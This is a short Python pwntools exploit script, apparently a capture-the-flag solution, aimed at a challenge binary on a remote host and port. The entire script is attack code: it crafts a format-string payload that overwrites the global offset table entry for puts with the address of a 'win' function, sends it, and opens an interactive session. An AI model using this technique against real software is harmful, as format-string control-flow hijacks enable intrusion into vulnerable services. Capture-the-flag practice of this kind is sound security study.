#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 8925
HOST = "nc.umbccd.net"
exe = context.binary = ELF('./out', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

win = exe.sym.win

fmt = f'%{win & 0xffff}c%10$hn'.encode()
pl  = flat(
	fmt.ljust(0x20, b'A'),
	exe.got.puts
	)
input()
p.sendline(pl)

p.interactive()